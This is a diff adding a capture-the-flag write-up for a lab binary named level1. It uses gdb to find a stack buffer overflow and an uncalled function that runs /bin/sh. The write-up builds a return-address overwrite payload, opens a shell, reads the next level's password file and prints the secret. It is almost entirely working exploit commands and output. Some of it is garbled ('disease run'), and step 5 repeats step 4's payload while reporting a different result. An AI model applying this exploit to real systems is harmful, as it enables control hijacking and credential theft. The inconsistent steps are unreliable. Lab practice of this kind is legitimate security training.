@@ -1,0 +1,49 @@
+1. See files:
+	ls
+We binary file level1
+2. Try to use it: 
+	./level1
+Wait input and exit after press Enter.
+3. Analyze with gdb:
+	gdb level1
+	disas main
+0x08048483 <+3>:		and    esp,0xfffffff0
+0x08048486 <+6>:		sub    esp,0x50 <--------- Buffer of 80
+	info function
+0x08048420  frame_dummy
+0x08048444  run <---------- function not called in main
+	disease run
+....
+   0x08048479 <+53>:	call   0x8048360 <system@plt> <------- system call
+... 
+We system call
+Check argument:
+	(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+4. Make EIP offset:
+	python -c 'print "B"*80' > /tmp/payload
+Run with it:
+	(gdb) r < /tmp/payload
+Starting program: /home/user/level1/level1 < /tmp/payload
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+Buffer is overwritten.
+5. Make offset less:
+	python -c 'print "B"*80' > /tmp/payload
+Run with it:
+	(gdb) r < /tmp/payload
+Starting program: /home/user/level1/level1 < /tmp/payload
+
+Program received signal SIGILL, Illegal instruction.
+0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
+It's ok
+6. Do it with address of function run 0x08048444:
+	python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/payload
+	cat /tmp/payload - | ./level1
+	cat /home/user/level2/.pass
+	53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+
+
